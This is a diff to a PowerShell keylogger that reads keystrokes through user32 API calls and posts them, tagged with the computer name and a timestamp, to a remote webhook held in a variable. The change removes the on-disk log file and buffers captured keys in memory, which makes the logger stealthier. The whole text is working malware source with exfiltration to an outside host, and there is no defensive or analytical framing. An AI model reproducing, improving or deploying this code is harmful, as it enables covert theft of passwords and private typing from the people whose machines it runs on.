@@ -28,12 +28,7 @@ public static extern int MapVirtualKey(uint uCode, int uMapType);
 [DllImport("user32.dll", CharSet=CharSet.Auto)]
 public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
 '@
-
-# Add Definitions and save file
-$logPath = "$env:temp/t.txt"
 $API = Add-Type -MemberDefinition $API -Name 'Win32' -Namespace API -PassThru
-$no = New-Item -Path $logPath -ItemType File -Force
-$fileContent = Get-Content -Path $logPath -Raw
 
 # Add stopwatch for intellegent sending
 $LastKeypressTime = [System.Diagnostics.Stopwatch]::StartNew()
@@ -69,8 +64,8 @@ While ($true){
                 if ($asc -eq 8) {$LString = "[BKSP]"}
                 if ($asc -eq 13) {$LString = "[ENT]"}
                 if ($asc -eq 27) {$LString = "[ESC]"}
-            # Add the key to the file
-            [System.IO.File]::AppendAllText($logPath, $LString, [System.Text.Encoding]::Unicode) 
+            # Add the key to sending variable
+            $send += $LString 
             }
           }
         }
@@ -79,14 +74,13 @@ While ($true){
     finally{
       If ($keyPressed) {
       # Send the saved keys to a webhook
-      $fileContent = Get-Content -Path $logPath -Raw
-      $escmsgsys = $fileContent -replace '[&<>]', {$args[0].Value.Replace('&', '&amp;').Replace('<', '&lt;').Replace('>', '&gt;')}
+      $escmsgsys = $send -replace '[&<>]', {$args[0].Value.Replace('&', '&amp;').Replace('<', '&lt;').Replace('>', '&gt;')}
       $timestamp = Get-Date -Format "dd-MM-yyyy HH:mm:ss"
       $escmsg = $timestamp+" : "+'`'+$escmsgsys+'`'
       $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = $escmsg} | ConvertTo-Json
       Invoke-RestMethod -Uri $dc -Method Post -ContentType "application/json" -Body $jsonsys
       #Remove log file and reset inactivity check 
-      Remove-Item -Path $logPath -Force
+      $send = ""
       $keyPressed = $false
       }
     }
